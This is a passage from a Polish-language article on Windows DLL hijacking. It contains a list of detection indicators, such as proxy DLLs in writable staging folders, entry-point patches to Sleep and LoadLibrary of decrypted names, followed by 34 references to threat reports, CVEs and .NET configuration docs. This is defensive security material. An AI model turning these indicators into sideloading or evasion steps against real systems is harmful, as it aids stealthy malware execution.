- Podpisane procesy ładujące `version.dll` lub podobne popularne biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Modyfikacje pamięci w punkcie wejścia procesu krótko po załadowaniu obrazu, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla kolejnej DLL o odszyfrowanej nazwie.
- Proxy DLL z pełnym zestawem eksportów umieszczane obok plików wykonywalnych dostawców w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Analiza wywiadowcza: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Eskalacja uprawnień z użyciem TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: gdy DLL Hijack spotyka narzędzia pomocnicze Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórzy: analiza ewoluujących kampanii podszywania się, które rozprzestrzeniają Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: analiza klastrów zagrożeń atakujących rząd państwa Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: analiza sieci przekaźników i działania ukrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: szczegółowa analiza zestawu narzędzi Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: łańcuch ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich Serpens prowadzonych przez irański APT w 2026 roku](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Szybcy i wściekli: działania Nimbus Manticore podczas konfliktu z Iranem](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Akcje zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 atakuje rządy i infrastrukturę krytyczną w Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Odtwarzanie i wykrywanie hijackingu kolejności wyszukiwania Windows DLL za pomocą Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Tworzenie bibliotek natywnych za pomocą Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Natywne eksporty za pomocą Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Kolejność wyszukiwania bibliotek dynamicznych](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Format PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Odkrywanie wariantu SectopRAT osadzonego w legalnym oprogramowaniu](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Kradzież LIGHTSHOW (część pierwsza)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operacja FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
